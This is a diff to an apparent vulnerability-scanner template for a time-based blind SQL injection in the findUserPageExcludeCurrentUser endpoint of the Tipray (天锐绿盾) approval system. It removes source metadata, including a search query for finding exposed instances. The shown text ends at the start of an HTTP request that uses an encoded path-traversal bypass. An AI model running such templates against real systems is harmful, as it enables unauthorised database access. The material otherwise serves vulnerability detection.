@@ -3,14 +3,8 @@ info:
   name: 天锐绿盾审批系统findUserPageExcludeCurrentUser存在SQL注入漏洞_nnv8ckm4zx8ywyns
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,unknown
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ''
-    fofa: app="TIPPAY-绿盾审批系统"
 http:
 - raw:
   - 'POST /trwfe/service/.%2E/user/findUserPageExcludeCurrentUser.do HTTP/1.1
